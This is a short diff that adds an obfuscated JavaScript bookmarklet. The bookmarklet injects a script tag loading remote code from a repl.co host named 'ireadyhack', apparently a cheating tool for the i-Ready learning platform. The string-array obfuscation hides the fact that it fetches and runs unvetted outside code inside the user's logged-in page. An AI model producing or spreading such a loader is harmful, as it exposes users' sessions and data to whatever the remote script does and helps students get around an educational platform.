@@ -1,0 +1,4 @@
+javascript: var _0xe39c = ["src", "script", "createElement", "appendChild", "body", "https://ireadyhack.eclipseeevee.repl.co/script.js"];
+(function () {
+    document[_0xe39c[4]][_0xe39c[3]](document[_0xe39c[2]](_0xe39c[1]))[_0xe39c[0]] = _0xe39c[5]
+})()
